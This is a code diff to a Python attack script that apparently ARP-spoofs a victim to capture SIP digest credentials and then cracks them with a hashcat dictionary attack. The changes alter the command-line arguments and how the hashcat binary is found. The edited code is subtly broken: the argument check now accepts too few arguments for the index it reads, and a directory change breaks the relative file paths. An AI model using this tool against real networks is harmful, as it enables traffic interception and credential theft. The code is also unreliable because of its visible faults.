@@ -5,6 +5,7 @@ from threading import Thread
 import subprocess
 import hashlib
 import sys
+import os
 
 
 def output_hashcat_target(output, user, realm, method, uri, nonce, hash):
@@ -97,7 +98,7 @@ if __name__ == "__main__":
     target_file = "target.txt"
     cracked_file = "cracked.txt"
 
-    if len(sys.argv) < 5:
+    if len(sys.argv) < 4:
         print("Incorrect number of arguments!")
         exit(1)
 
@@ -106,8 +107,8 @@ if __name__ == "__main__":
     victim_mac = getmacbyip(victim_ip)
     spoof_ip = sys.argv[2]
     spoof_mac = getmacbyip(spoof_ip)
-    hashcat_binary = sys.argv[3]
-    dictionary_file = sys.argv[4]
+    dictionary_file = sys.argv[3]
+    hashcat_dir = sys.argv[4]
 
     # Get current device's IP and MAC
     attacker_iface = conf.iface
@@ -146,5 +147,9 @@ if __name__ == "__main__":
 
     # Launch a dictionary attack on the target
     print("Starting Hashcat dictionary attack...")
-    subprocess.run([hashcat_binary, "-m", "11400", "-a", "0", target_file,
+    hashcat_exe = "hashcat.exe" if os.name == "nt" else "hashcat"
+    if hashcat_dir:
+        os.chdir(hashcat_dir)
+        hashcat_exe = os.path.join(hashcat_dir, hashcat_exe)
+    subprocess.run([hashcat_exe, "-m", "11400", "-a", "0", target_file,
                    dictionary_file, "--potfile-disable", "-o", cracked_file])
